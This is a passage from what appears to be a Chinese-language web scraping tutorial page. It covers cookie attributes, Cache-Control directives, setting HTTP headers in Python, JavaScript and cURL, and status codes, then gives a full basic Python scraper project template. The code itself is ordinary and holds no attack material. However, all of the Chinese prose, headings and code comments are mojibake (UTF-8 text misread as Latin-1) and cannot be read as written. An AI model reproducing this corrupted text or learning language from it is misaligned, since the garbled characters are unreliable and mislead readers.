  <td>è¿‡æœŸæ—¶é—´ï¼ˆç»å¯¹æ—¶é—´ï¼‰</td>
</tr>
<tr>
  <td><code>Max-Age</code></td>
  <td>å­˜æ´»æ—¶é—´ï¼ˆç§’ï¼‰</td>
</tr>
<tr>
  <td><code>Secure</code></td>
  <td>ä»… HTTPS ä¼ è¾“</td>
</tr>
<tr>
  <td><code>HttpOnly</code></td>
  <td>ç¦æ­¢ JavaScript è®¿é—®</td>
</tr>
<tr>
  <td><code>SameSite</code></td>
  <td>è·¨ç«™è¯·æ±‚ç­–ç•¥ (Strict/Lax/None)</td>
</tr>
</tbody>
</table>
<h2>Cache-Control æŒ‡ä»¤</h2>
<h3>è¯·æ±‚æŒ‡ä»¤</h3>
<pre><code class="language-http">Cache-Control: no-cache          # ä¸ä½¿ç”¨ç¼“å­˜
Cache-Control: no-store          # ä¸å­˜å‚¨ç¼“å­˜
Cache-Control: max-age=0         # ç«‹å³è¿‡æœŸ
Cache-Control: max-stale=3600    # å¯æ¥å—è¿‡æœŸçš„ç¼“å­˜
Cache-Control: min-fresh=600     # å¿…é¡»æ–°é²œçš„ç¼“å­˜
Cache-Control: only-if-cached    # åªä½¿ç”¨ç¼“å­˜
</code></pre>
<h3>å“åº”æŒ‡ä»¤</h3>
<pre><code class="language-http">Cache-Control: public                    # å¯è¢«ä»»ä½•ç¼“å­˜å­˜å‚¨
Cache-Control: private                   # åªèƒ½è¢«æµè§ˆå™¨ç¼“å­˜
Cache-Control: no-cache                  # éœ€è¦éªŒè¯
Cache-Control: no-store                  # ä¸èƒ½ç¼“å­˜
Cache-Control: max-age=3600              # ç¼“å­˜3600ç§’
Cache-Control: s-maxage=3600             # å…±äº«ç¼“å­˜æ—¶é—´
Cache-Control: must-revalidate           # è¿‡æœŸåå¿…é¡»éªŒè¯
Cache-Control: proxy-revalidate          # ä»£ç†ç¼“å­˜éœ€éªŒè¯
Cache-Control: immutable                 # ä¸ä¼šæ”¹å˜
</code></pre>
<h2>Python è®¾ç½® Headers</h2>
<pre><code class="language-python">import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'application/json',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/json',
    'Authorization': 'Bearer your_token_here',
    'X-Requested-With': 'XMLHttpRequest',
    'Referer': 'https://example.com',
    'Origin': 'https://example.com'
}

response = requests.get('https://api.example.com/data', headers=headers)
</code></pre>
<h2>JavaScript è®¾ç½® Headers</h2>
<pre><code class="language-javascript">// Fetch API
fetch(&quot;https://api.example.com/data&quot;, {
  method: &quot;POST&quot;,
  headers: {
    &quot;Content-Type&quot;: &quot;application/json&quot;,
    Authorization: &quot;Bearer your_token_here&quot;,
    &quot;X-Custom-Header&quot;: &quot;custom_value&quot;,
  },
  body: JSON.stringify({ key: &quot;value&quot; }),
});

// XHR
const xhr = new XMLHttpRequest();
xhr.open(&quot;POST&quot;, &quot;https://api.example.com/data&quot;);
xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;application/json&quot;);
xhr.setRequestHeader(&quot;Authorization&quot;, &quot;Bearer your_token_here&quot;);
xhr.send(JSON.stringify({ key: &quot;value&quot; }));
</code></pre>
<h2>cURL è®¾ç½® Headers</h2>
<pre><code class="language-bash">curl https://api.example.com/data \
  -H &quot;User-Agent: Mozilla/5.0...&quot; \
  -H &quot;Accept: application/json&quot; \
  -H &quot;Content-Type: application/json&quot; \
  -H &quot;Authorization: Bearer your_token_here&quot; \
  -H &quot;X-Custom-Header: custom_value&quot; \
  -d '{&quot;key&quot;:&quot;value&quot;}'
</code></pre>
<h2>å¸¸è§çŠ¶æ€ç å¯¹ç…§</h2>
<table>
<thead>
<tr>
  <th>çŠ¶æ€ç </th>
  <th>è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
  <td>200</td>
  <td>OK - æˆåŠŸ</td>
</tr>
<tr>
  <td>201</td>
  <td>Created - å·²åˆ›å»º</td>
</tr>
<tr>
  <td>204</td>
  <td>No Content - æ— å†…å®¹</td>
</tr>
<tr>
  <td>301</td>
  <td>Moved Permanently - æ°¸ä¹…é‡å®šå‘</td>
</tr>
<tr>
  <td>302</td>
  <td>Found - ä¸´æ—¶é‡å®šå‘</td>
</tr>
<tr>
  <td>304</td>
  <td>Not Modified - æœªä¿®æ”¹ï¼ˆç¼“å­˜æœ‰æ•ˆï¼‰</td>
</tr>
<tr>
  <td>400</td>
  <td>Bad Request - è¯·æ±‚é”™è¯¯</td>
</tr>
<tr>
  <td>401</td>
  <td>Unauthorized - æœªæˆæƒ</td>
</tr>
<tr>
  <td>403</td>
  <td>Forbidden - ç¦æ­¢è®¿é—®</td>
</tr>
<tr>
  <td>404</td>
  <td>Not Found - æœªæ‰¾åˆ°</td>
</tr>
<tr>
  <td>405</td>
  <td>Method Not Allowed - æ–¹æ³•ä¸å…è®¸</td>
</tr>
<tr>
  <td>429</td>
  <td>Too Many Requests - è¯·æ±‚è¿‡å¤š</td>
</tr>
<tr>
  <td>500</td>
  <td>Internal Server Error - æœåŠ¡å™¨é”™è¯¯</td>
</tr>
<tr>
  <td>502</td>
  <td>Bad Gateway - ç½‘å…³é”™è¯¯</td>
</tr>
<tr>
  <td>503</td>
  <td>Service Unavailable - æœåŠ¡ä¸å¯ç”¨</td>
</tr>
</tbody>
</table>
<h2>ğŸ“š ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-5">HTTP/HTTPS åè®®</a></li>
<li><a href="#section-28">API é€†å‘</a></li>
<li><a href="#section-63">å¸¸ç”¨å‘½ä»¤</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-68">
                                                <h2>[R67] Overview</h2>
                                                <h1>R67: é¡¹ç›®æ¨¡æ¿ - Templates</h1>
<p>å³ç”¨å‹é¡¹ç›®æ¨¡æ¿å’Œé…ç½®æ–‡ä»¶ï¼Œå¸®åŠ©ä½ å¿«é€Ÿå¯åŠ¨æ–°çš„é€†å‘é¡¹ç›®ã€‚</p>
<hr />
<h2>ğŸ“¦ å¯ç”¨æ¨¡æ¿</h2>
<h3>ğŸ <a href="#section-69">åŸºç¡€çˆ¬è™«é¡¹ç›®</a></h3>
<p>ä¸€ä¸ªç®€å•çš„ Python çˆ¬è™«é¡¹ç›®ç»“æ„ï¼ŒåŒ…å«ï¼š</p>
<ul>
<li>æ ‡å‡†ç›®å½•ç»“æ„</li>
<li>é…ç½®æ–‡ä»¶ç®¡ç†</li>
<li>æ—¥å¿—ç³»ç»Ÿ</li>
<li>æ•°æ®å­˜å‚¨</li>
<li>é”™è¯¯å¤„ç†</li>
</ul>
<p><strong>é€‚ç”¨äº</strong>: å•æœºçˆ¬è™«ã€API æ•°æ®é‡‡é›†</p>
<hr />
<h3>ğŸ¯ <a href="#section-70">é€†å‘åˆ†æé¡¹ç›®</a></h3>
<p>Web é€†å‘åˆ†æçš„æ ‡å‡†é¡¹ç›®æ¨¡æ¿ï¼š</p>
<ul>
<li>åˆ†ææ–‡æ¡£æ¨¡æ¿</li>
<li>ä»£ç ç»„ç»‡ç»“æ„</li>
<li>æµ‹è¯•ç”¨ä¾‹</li>
<li>å¤ç°è„šæœ¬</li>
</ul>
<p><strong>é€‚ç”¨äº</strong>: å•ä¸ªç½‘ç«™çš„å®Œæ•´é€†å‘åˆ†æ</p>
<hr />
<h3>ğŸ³ <a href="#section-71">Docker éƒ¨ç½²é…ç½®</a></h3>
<p>å®¹å™¨åŒ–éƒ¨ç½²é…ç½®ï¼š</p>
<ul>
<li>Dockerfile</li>
<li>docker-compose.yml</li>
<li>ç¯å¢ƒå˜é‡é…ç½®</li>
<li>ç½‘ç»œé…ç½®</li>
</ul>
<p><strong>é€‚ç”¨äº</strong>: çˆ¬è™«éƒ¨ç½²ã€æœåŠ¡åŒ–</p>
<hr />
<h3>ğŸ”„ <a href="#section-72">CI/CD æµæ°´çº¿</a></h3>
<p>è‡ªåŠ¨åŒ–æ„å»ºå’Œéƒ¨ç½²ï¼š</p>
<ul>
<li>GitHub Actions</li>
<li>GitLab CI</li>
<li>Jenkins</li>
<li>è‡ªåŠ¨åŒ–æµ‹è¯•</li>
</ul>
<p><strong>é€‚ç”¨äº</strong>: æŒç»­é›†æˆã€è‡ªåŠ¨åŒ–éƒ¨ç½²</p>
<hr />
<h3>ğŸ“Š <a href="#section-73">åˆ†å¸ƒå¼çˆ¬è™«æ¶æ„</a></h3>
<p>åŸºäº Scrapy + Redis çš„åˆ†å¸ƒå¼æ¶æ„ï¼š</p>
<ul>
<li>Scrapy é¡¹ç›®ç»“æ„</li>
<li>Redis é˜Ÿåˆ—é…ç½®</li>
<li>åˆ†å¸ƒå¼è°ƒåº¦</li>
<li>ç›‘æ§å’Œæ—¥å¿—</li>
</ul>
<p><strong>é€‚ç”¨äº</strong>: å¤§è§„æ¨¡æ•°æ®é‡‡é›†</p>
<hr />
<h2>ğŸš€ å¿«é€Ÿå¼€å§‹</h2>
<h3>ä½¿ç”¨æ¨¡æ¿</h3>
<ol>
<li><strong>å¤åˆ¶æ¨¡æ¿ç›®å½•</strong></li>
</ol>
<pre><code class="language-bash">cp -r templates/basic_scraper my_project
cd my_project
</code></pre>
<ol start="2">
<li><strong>å®‰è£…ä¾èµ–</strong></li>
</ol>
<pre><code class="language-bash">pip install -r requirements.txt
</code></pre>
<ol start="3">
<li><strong>é…ç½®å‚æ•°</strong></li>
</ol>
<pre><code class="language-bash"># ç¼–è¾‘ config.py
vim config.py
</code></pre>
<ol start="4">
<li><strong>è¿è¡Œé¡¹ç›®</strong></li>
</ol>
<pre><code class="language-bash">python main.py
</code></pre>
<hr />
<h2>ğŸ“ è‡ªå®šä¹‰æ¨¡æ¿</h2>
<p>ä½ å¯ä»¥åŸºäºè¿™äº›æ¨¡æ¿åˆ›å»ºè‡ªå·±çš„é¡¹ç›®ï¼š</p>
<h3>ä¿®æ”¹é…ç½®</h3>
<ul>
<li>æ›´æ–° <code>config.py</code> ä¸­çš„ç›®æ ‡ URL</li>
<li>ä¿®æ”¹è¯·æ±‚å¤´å’Œå‚æ•°</li>
<li>é…ç½®æ•°æ®åº“è¿æ¥</li>
</ul>
<h3>æ‰©å±•åŠŸèƒ½</h3>
<ul>
<li>æ·»åŠ æ–°çš„çˆ¬è™«æ¨¡å—</li>
<li>é›†æˆæ›´å¤šæ•°æ®æº</li>
<li>å®ç°è‡ªå®šä¹‰ä¸­é—´ä»¶</li>
</ul>
<hr />
<h2>ğŸ’¡ æœ€ä½³å®è·µ</h2>
<h3>é¡¹ç›®ç»“æ„å»ºè®®</h3>
<pre><code>project/
â”œâ”€â”€ config/              # é…ç½®æ–‡ä»¶
â”‚   â”œâ”€â”€ __init__.py
â”‚   â”œâ”€â”€ settings.py
â”‚   â””â”€â”€ logging.conf
â”œâ”€â”€ spiders/            # çˆ¬è™«æ¨¡å—
â”‚   â”œâ”€â”€ __init__.py
â”‚   â””â”€â”€ target_spider.py
â”œâ”€â”€ utils/              # å·¥å…·å‡½æ•°
â”‚   â”œâ”€â”€ __init__.py
â”‚   â”œâ”€â”€ crypto.py       # åŠ å¯†è§£å¯†
â”‚   â””â”€â”€ headers.py      # è¯·æ±‚å¤´ç”Ÿæˆ
â”œâ”€â”€ data/               # æ•°æ®å­˜å‚¨
â”‚   â””â”€â”€ output/
â”œâ”€â”€ logs/               # æ—¥å¿—æ–‡ä»¶
â”œâ”€â”€ tests/              # æµ‹è¯•ç”¨ä¾‹
â”‚   â””â”€â”€ test_spider.py
â”œâ”€â”€ requirements.txt    # ä¾èµ–åˆ—è¡¨
â”œâ”€â”€ README.md          # é¡¹ç›®è¯´æ˜
â””â”€â”€ main.py            # å…¥å£æ–‡ä»¶
</code></pre>
<h3>é…ç½®ç®¡ç†</h3>
<p>ä½¿ç”¨ç¯å¢ƒå˜é‡å’Œé…ç½®æ–‡ä»¶åˆ†ç¦»æ•æ„Ÿä¿¡æ¯ï¼š</p>
<pre><code class="language-python"># config/settings.py
import os
from dotenv import load_dotenv

load_dotenv()

# æ•°æ®åº“é…ç½®
DB_HOST = os.getenv('DB_HOST', 'localhost')
DB_USER = os.getenv('DB_USER', 'root')
DB_PASS = os.getenv('DB_PASS', '')

# API é…ç½®
API_KEY = os.getenv('API_KEY', '')
SECRET_KEY = os.getenv('SECRET_KEY', '')
</code></pre>
<h3>ç‰ˆæœ¬æ§åˆ¶</h3>
<p><code>.gitignore</code> ç¤ºä¾‹ï¼š</p>
<pre><code># Python
__pycache__/
*.py[cod]
*.egg-info/
venv/
.env

# æ•°æ®å’Œæ—¥å¿—
data/
logs/
*.log

# IDE
.vscode/
.idea/
*.swp

# æ•æ„Ÿä¿¡æ¯
config/secrets.py
.env.local
</code></pre>
<hr />
<h2>ğŸ”— ç›¸å…³èµ„æº</h2>
<ul>
<li><a href="#section-55">Docker éƒ¨ç½²</a></li>
<li><a href="#section-51">åˆ†å¸ƒå¼çˆ¬è™«</a></li>
<li><a href="#section-56">ç›‘æ§å‘Šè­¦</a></li>
</ul>
<hr />
<p>Happy Coding! ğŸš€</p>

                                            </div>
                                            
                                            <div class="section" id="section-69">
                                                <h2>[R68] Basic Scraper</h2>
                                                <h1>R68: åŸºç¡€çˆ¬è™«é¡¹ç›®æ¨¡æ¿</h1>
<p>ä¸€ä¸ªç®€å•ä½†å®Œæ•´çš„ Python çˆ¬è™«é¡¹ç›®æ¨¡æ¿ï¼Œé€‚åˆå•æœºæ•°æ®é‡‡é›†ã€‚</p>
<hr />
<h2>ğŸ“ é¡¹ç›®ç»“æ„</h2>
<pre><code>basic_scraper/
â”œâ”€â”€ config/
â”‚   â”œâ”€â”€ __init__.py
â”‚   â”œâ”€â”€ settings.py          # é…ç½®å‚æ•°
â”‚   â””â”€â”€ logging.conf         # æ—¥å¿—é…ç½®
â”œâ”€â”€ scrapers/
â”‚   â”œâ”€â”€ __init__.py
â”‚   â”œâ”€â”€ base_scraper.py      # åŸºç¡€çˆ¬è™«ç±»
â”‚   â””â”€â”€ target_scraper.py    # ç›®æ ‡ç½‘ç«™çˆ¬è™«
â”œâ”€â”€ utils/
â”‚   â”œâ”€â”€ __init__.py
â”‚   â”œâ”€â”€ crypto.py            # åŠ å¯†è§£å¯†å·¥å…·
â”‚   â”œâ”€â”€ headers.py           # è¯·æ±‚å¤´ç”Ÿæˆ
â”‚   â””â”€â”€ parser.py            # æ•°æ®è§£æ
â”œâ”€â”€ data/
â”‚   â”œâ”€â”€ raw/                 # åŸå§‹æ•°æ®
â”‚   â””â”€â”€ processed/           # å¤„ç†åæ•°æ®
â”œâ”€â”€ logs/                    # æ—¥å¿—ç›®å½•
â”œâ”€â”€ tests/
â”‚   â”œâ”€â”€ __init__.py
â”‚   â””â”€â”€ test_scraper.py      # æµ‹è¯•ç”¨ä¾‹
â”œâ”€â”€ .env.example             # ç¯å¢ƒå˜é‡ç¤ºä¾‹
â”œâ”€â”€ .gitignore
â”œâ”€â”€ requirements.txt
â”œâ”€â”€ README.md
â””â”€â”€ main.py                  # å…¥å£æ–‡ä»¶
</code></pre>
<hr />
<h2>ğŸ“„ æ–‡ä»¶å†…å®¹</h2>
<h3>1. requirements.txt</h3>
<pre><code class="language-txt">requests&gt;=2.31.0
beautifulsoup4&gt;=4.12.0
lxml&gt;=4.9.0
python-dotenv&gt;=1.0.0
pycryptodome&gt;=3.19.0
pymongo&gt;=4.6.0
redis&gt;=5.0.0
loguru&gt;=0.7.0
</code></pre>
<h3>2. config/settings.py</h3>
<pre><code class="language-python">&quot;&quot;&quot;
é¡¹ç›®é…ç½®æ–‡ä»¶
&quot;&quot;&quot;
import os
from dotenv import load_dotenv
from pathlib import Path

# åŠ è½½ç¯å¢ƒå˜é‡
load_dotenv()

# é¡¹ç›®æ ¹ç›®å½•
BASE_DIR = Path(__file__).resolve().parent.parent

# ç›®æ ‡ç½‘ç«™é…ç½®
TARGET_URL = &quot;https://example.com&quot;
API_BASE_URL = &quot;https://api.example.com&quot;

# è¯·æ±‚é…ç½®
REQUEST_TIMEOUT = 30
MAX_RETRIES = 3
RETRY_DELAY = 2  # ç§’

# è¯·æ±‚å¤´é…ç½®
DEFAULT_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
    'Accept-Encoding': 'gzip, deflate, br',
}

# ä»£ç†é…ç½®
USE_PROXY = os.getenv('USE_PROXY', 'false').lower() == 'true'
PROXY_URL = os.getenv('PROXY_URL', '')
PROXIES = {
    'http': PROXY_URL,
    'https': PROXY_URL,
} if USE_PROXY and PROXY_URL else None

# æ•°æ®åº“é…ç½®
MONGODB_URI = os.getenv('MONGODB_URI', 'mongodb://localhost:27017/')
MONGODB_DB = os.getenv('MONGODB_DB', 'scraper_db')
MONGODB_COLLECTION = os.getenv('MONGODB_COLLECTION', 'data')

# Redis é…ç½®
REDIS_HOST = os.getenv('REDIS_HOST', 'localhost')
REDIS_PORT = int(os.getenv('REDIS_PORT', 6379))
REDIS_DB = int(os.getenv('REDIS_DB', 0))
REDIS_PASSWORD = os.getenv('REDIS_PASSWORD', '')

# æ•°æ®å­˜å‚¨é…ç½®
DATA_DIR = BASE_DIR / 'data'
RAW_DATA_DIR = DATA_DIR / 'raw'
PROCESSED_DATA_DIR = DATA_DIR / 'processed'

# æ—¥å¿—é…ç½®
LOG_DIR = BASE_DIR / 'logs'
LOG_LEVEL = os.getenv('LOG_LEVEL', 'INFO')

# åˆ›å»ºå¿…è¦çš„ç›®å½•
for directory in [DATA_DIR, RAW_DATA_DIR, PROCESSED_DATA_DIR, LOG_DIR]:
    directory.mkdir(parents=True, exist_ok=True)

# ä¸šåŠ¡é…ç½®
BATCH_SIZE = 100  # æ‰¹å¤„ç†å¤§å°
SLEEP_INTERVAL = (1, 3)  # è¯·æ±‚é—´éš”ï¼ˆç§’ï¼‰èŒƒå›´
</code></pre>
<h3>3. config/logging.conf</h3>
<pre><code class="language-python">&quot;&quot;&quot;
æ—¥å¿—é…ç½®
&quot;&quot;&quot;
from loguru import logger
import sys
from pathlib import Path

# æ—¥å¿—ç›®å½•
LOG_DIR = Path(__file__).resolve().parent.parent / 'logs'
LOG_DIR.mkdir(exist_ok=True)

# ç§»é™¤é»˜è®¤å¤„ç†å™¨
logger.remove()

# æ·»åŠ æ§åˆ¶å°è¾“å‡º
logger.add(
    sys.stdout,
    colorize=True,
    format=&quot;&lt;green&gt;{time:YYYY-MM-DD HH:mm:ss}&lt;/green&gt; | &lt;level&gt;{level: &lt;8}&lt;/level&gt; | &lt;cyan&gt;{name}&lt;/cyan&gt;:&lt;cyan&gt;{function}&lt;/cyan&gt;:&lt;cyan&gt;{line}&lt;/cyan&gt; - &lt;level&gt;{message}&lt;/level&gt;&quot;,
    level=&quot;INFO&quot;
)

# æ·»åŠ æ–‡ä»¶è¾“å‡º - INFO çº§åˆ«
logger.add(
    LOG_DIR / &quot;info_{time:YYYY-MM-DD}.log&quot;,
    rotation=&quot;00:00&quot;,  # æ¯å¤©åˆå¤œè½®è½¬
    retention=&quot;30 days&quot;,  # ä¿ç•™30å¤©
    encoding=&quot;utf-8&quot;,
    format=&quot;{time:YYYY-MM-DD HH:mm:ss} | {level: &lt;8} | {name}:{function}:{line} - {message}&quot;,
    level=&quot;INFO&quot;
)

# æ·»åŠ æ–‡ä»¶è¾“å‡º - ERROR çº§åˆ«
logger.add(
    LOG_DIR / &quot;error_{time:YYYY-MM-DD}.log&quot;,
    rotation=&quot;00:00&quot;,
    retention=&quot;90 days&quot;,  # é”™è¯¯æ—¥å¿—ä¿ç•™90å¤©
    encoding=&quot;utf-8&quot;,
    format=&quot;{time:YYYY-MM-DD HH:mm:ss} | {level: &lt;8} | {name}:{function}:{line} - {message}&quot;,
    level=&quot;ERROR&quot;
)
</code></pre>
<h3>4. scrapers/base_scraper.py</h3>
<pre><code class="language-python">&quot;&quot;&quot;
åŸºç¡€çˆ¬è™«ç±»
&quot;&quot;&quot;
import time
import random
import requests
from typing import Dict, Any, Optional
from config.settings import *
from config.logging import logger


class BaseScraper:
    &quot;&quot;&quot;åŸºç¡€çˆ¬è™«ç±»&quot;&quot;&quot;

    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update(DEFAULT_HEADERS)

    def request(
        self,
        method: str,
        url: str,
        **kwargs
    ) -&gt; Optional[requests.Response]:
        &quot;&quot;&quot;
        å‘é€ HTTP è¯·æ±‚ï¼ˆå¸¦é‡è¯•ï¼‰

        Args:
            method: HTTP æ–¹æ³• (GET, POST, etc.)
            url: è¯·æ±‚ URL
            **kwargs: å…¶ä»–è¯·æ±‚å‚æ•°

        Returns:
            Response å¯¹è±¡æˆ– None
        &quot;&quot;&quot;
        for attempt in range(MAX_RETRIES):
            try:
                # åˆå¹¶ä»£ç†é…ç½®
                if PROXIES:
                    kwargs.setdefault('proxies', PROXIES)

                # è®¾ç½®è¶…æ—¶
                kwargs.setdefault('timeout', REQUEST_TIMEOUT)

                # å‘é€è¯·æ±‚
                response = self.session.request(method, url, **kwargs)
                response.raise_for_status()

                logger.info(f&quot;è¯·æ±‚æˆåŠŸ: {method} {url} - {response.status_code}&quot;)
                return response

            except requests.exceptions.RequestException as e:
                logger.warning(f&quot;è¯·æ±‚å¤±è´¥ (å°è¯• {attempt + 1}/{MAX_RETRIES}): {e}&quot;)

                if attempt &lt; MAX_RETRIES - 1:
                    time.sleep(RETRY_DELAY * (attempt + 1))
                else:
                    logger.error(f&quot;è¯·æ±‚æœ€ç»ˆå¤±è´¥: {method} {url}&quot;)
                    return None

    def get(self, url: str, **kwargs) -&gt; Optional[requests.Response]:
        &quot;&quot;&quot;GET è¯·æ±‚&quot;&quot;&quot;
        return self.request('GET', url, **kwargs)

    def post(self, url: str, **kwargs) -&gt; Optional[requests.Response]:
        &quot;&quot;&quot;POST è¯·æ±‚&quot;&quot;&quot;
        return self.request('POST', url, **kwargs)

    def sleep(self):
        &quot;&quot;&quot;éšæœºä¼‘çœ &quot;&quot;&quot;
        sleep_time = random.uniform(*SLEEP_INTERVAL)
        logger.debug(f&quot;ä¼‘çœ  {sleep_time:.2f} ç§’&quot;)
        time.sleep(sleep_time)

    def save_json(self, data: Dict[Any, Any], filename: str):
        &quot;&quot;&quot;ä¿å­˜ JSON æ•°æ®&quot;&quot;&quot;
        import json
        filepath = PROCESSED_DATA_DIR / filename

        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)

        logger.info(f&quot;æ•°æ®å·²ä¿å­˜: {filepath}&quot;)

    def save_csv(self, data: list, filename: str):
        &quot;&quot;&quot;ä¿å­˜ CSV æ•°æ®&quot;&quot;&quot;
        import csv

        if not data:
            logger.warning(&quot;æ²¡æœ‰æ•°æ®å¯ä¿å­˜&quot;)
            return

        filepath = PROCESSED_DATA_DIR / filename

        with open(filepath, 'w', encoding='utf-8', newline='') as f:
            writer = csv.DictWriter(f, fieldnames=data[0].keys())
            writer.writeheader()
            writer.writerows(data)

        logger.info(f&quot;æ•°æ®å·²ä¿å­˜: {filepath} ({len(data)} æ¡)&quot;)
</code></pre>
<h3>5. scrapers/target_scraper.py</h3>
<pre><code class="language-python">&quot;&quot;&quot;
ç›®æ ‡ç½‘ç«™çˆ¬è™«
&quot;&quot;&quot;
from bs4 import BeautifulSoup
from .base_scraper import BaseScraper
from config.settings import TARGET_URL
from config.logging import logger


class TargetScraper(BaseScraper):
    &quot;&quot;&quot;ç›®æ ‡ç½‘ç«™çˆ¬è™«&quot;&quot;&quot;

    def __init__(self):
        super().__init__()
        self.base_url = TARGET_URL

    def scrape_list(self, page: int = 1):
        &quot;&quot;&quot;
        æŠ“å–åˆ—è¡¨é¡µ

        Args:
            page: é¡µç 

        Returns:
            åˆ—è¡¨æ•°æ®
        &quot;&quot;&quot;
        url = f&quot;{self.base_url}/list?page={page}&quot;
        response = self.get(url)

        if not response:
            return []

        soup = BeautifulSoup(response.text, 'lxml')
        items = []

        # TODO: å®ç°å…·ä½“çš„è§£æé€»è¾‘
        for item in soup.select('.item'):
            data = {
                'title': item.select_one('.title').text.strip(),
                'link': item.select_one('a')['href'],
                # æ·»åŠ æ›´å¤šå­—æ®µ...
            }
            items.append(data)

        logger.info(f&quot;é¡µé¢ {page} æŠ“å–åˆ° {len(items)} æ¡æ•°æ®&quot;)
        return items

    def scrape_detail(self, url: str):
        &quot;&quot;&quot;
        æŠ“å–è¯¦æƒ…é¡µ

        Args:
            url: è¯¦æƒ…é¡µ URL

        Returns:
            è¯¦æƒ…æ•°æ®
        &quot;&quot;&quot;
        response = self.get(url)

        if not response:
            return None

        soup = BeautifulSoup(response.text, 'lxml')

        # TODO: å®ç°å…·ä½“çš„è§£æé€»è¾‘
        data = {
            'url': url,
            'title': soup.select_one('h1').text.strip(),
            'content': soup.select_one('.content').text.strip(),
            # æ·»åŠ æ›´å¤šå­—æ®µ...
        }

        logger.info(f&quot;è¯¦æƒ…é¡µæŠ“å–æˆåŠŸ: {url}&quot;)
        return data

    def run(self, start_page: int = 1, end_page: int = 10):
        &quot;&quot;&quot;
        è¿è¡Œçˆ¬è™«

        Args:
            start_page: èµ·å§‹é¡µ
            end_page: ç»“æŸé¡µ
        &quot;&quot;&quot;
        logger.info(f&quot;å¼€å§‹æŠ“å–: é¡µé¢ {start_page} åˆ° {end_page}&quot;)

        all_items = []

        for page in range(start_page, end_page + 1):
            # æŠ“å–åˆ—è¡¨
            items = self.scrape_list(page)
            all_items.extend(items)

            # ä¼‘çœ 
            self.sleep()

        # ä¿å­˜æ•°æ®
        self.save_json(all_items, 'list_data.json')
        self.save_csv(all_items, 'list_data.csv')

        logger.info(f&quot;æŠ“å–å®Œæˆ: å…± {len(all_items)} æ¡æ•°æ®&quot;)
</code></pre>
<h3>6. main.py</h3>
<pre><code class="language-python">&quot;&quot;&quot;
ä¸»ç¨‹åºå…¥å£
&quot;&quot;&quot;
from scrapers.target_scraper import TargetScraper
from config.logging import logger


def main():
    &quot;&quot;&quot;ä¸»å‡½æ•°&quot;&quot;&quot;
    logger.info(&quot;=&quot; * 50)
    logger.info(&quot;çˆ¬è™«ç¨‹åºå¯åŠ¨&quot;)
    logger.info(&quot;=&quot; * 50)

    try:
        # åˆ›å»ºçˆ¬è™«å®ä¾‹
        scraper = TargetScraper()

        # è¿è¡Œçˆ¬è™«
        scraper.run(start_page=1, end_page=5)

        logger.info(&quot;=&quot; * 50)
        logger.info(&quot;çˆ¬è™«ç¨‹åºç»“æŸ&quot;)
        logger.info(&quot;=&quot; * 50)

    except KeyboardInterrupt:
        logger.warning(&quot;ç”¨æˆ·ä¸­æ–­ç¨‹åº&quot;)
    except Exception as e:
        logger.exception(f&quot;ç¨‹åºå¼‚å¸¸: {e}&quot;)


if __name__ == '__main__':
    main()
</code></pre>
<h3>7. .env.example</h3>
<pre><code class="language-bash"># ä»£ç†é…ç½®
USE_PROXY=false
PROXY_URL=http://127.0.0.1:7890

# æ•°æ®åº“é…ç½®
MONGODB_URI=mongodb://localhost:27017/
MONGODB_DB=scraper_db
MONGODB_COLLECTION=data

# Redis é…ç½®
REDIS_HOST=localhost
REDIS_PORT=6379
REDIS_DB=0
REDIS_PASSWORD=

# æ—¥å¿—çº§åˆ«
LOG_LEVEL=INFO
</code></pre>
<h3>8. .gitignore</h3>
<pre><code># Python
__pycache__/
*.py[cod]
*$py.class
*.so
.Python
env/
venv/
ENV/
build/
develop-eggs/
dist/
downloads/
eggs/
.eggs/
lib/
lib64/
parts/
sdist/
var/
wheels/
*.egg-info/
.installed.cfg
*.egg

# ç¯å¢ƒå˜é‡
.env
.env.local

# æ•°æ®å’Œæ—¥å¿—
data/
logs/
*.log

# IDE
.vscode/
.idea/
*.swp
*.swo
.DS_Store

# æµ‹è¯•
.pytest_cache/
.coverage
htmlcov/
</code></pre>
<h3>9. README.md</h3>
<pre><code class="language-markdown"># åŸºç¡€çˆ¬è™«é¡¹ç›®

## åŠŸèƒ½ç‰¹æ€§

- âœ… å®Œæ•´çš„é¡¹ç›®ç»“æ„
- âœ… é…ç½®æ–‡ä»¶ç®¡ç†
- âœ… æ—¥å¿—ç³»ç»Ÿ (Loguru)
- âœ… é”™è¯¯é‡è¯•æœºåˆ¶
- âœ… ä»£ç†æ”¯æŒ
- âœ… æ•°æ®å­˜å‚¨ (JSON/CSV)
- âœ… ç¯å¢ƒå˜é‡é…ç½®

## å¿«é€Ÿå¼€å§‹

### 1. å®‰è£…ä¾èµ–

\`\`\`bash
pip install -r requirements.txt
\`\`\`

### 2. é…ç½®ç¯å¢ƒ

\`\`\`bash
cp .env.example .env

# ç¼–è¾‘ .env æ–‡ä»¶

\`\`\`

### 3. è¿è¡Œçˆ¬è™«

\`\`\`bash
python main.py
\`\`\`

## é¡¹ç›®ç»“æ„

\`\`\`
.
â”œâ”€â”€ config/ # é…ç½®æ–‡ä»¶
â”œâ”€â”€ scrapers/ # çˆ¬è™«æ¨¡å—
â”œâ”€â”€ utils/ # å·¥å…·å‡½æ•°
â”œâ”€â”€ data/ # æ•°æ®å­˜å‚¨
â”œâ”€â”€ logs/ # æ—¥å¿—æ–‡ä»¶
â””â”€â”€ main.py # å…¥å£æ–‡ä»¶
\`\`\`

## ä½¿ç”¨è¯´æ˜

### è‡ªå®šä¹‰çˆ¬è™«

1. ç¼–è¾‘ `scrapers/target_scraper.py`
2. å®ç° `scrape_list()` å’Œ `scrape_detail()` æ–¹æ³•
3. ä¿®æ”¹ `config/settings.py` ä¸­çš„ `TARGET_URL`

### æ•°æ®å­˜å‚¨

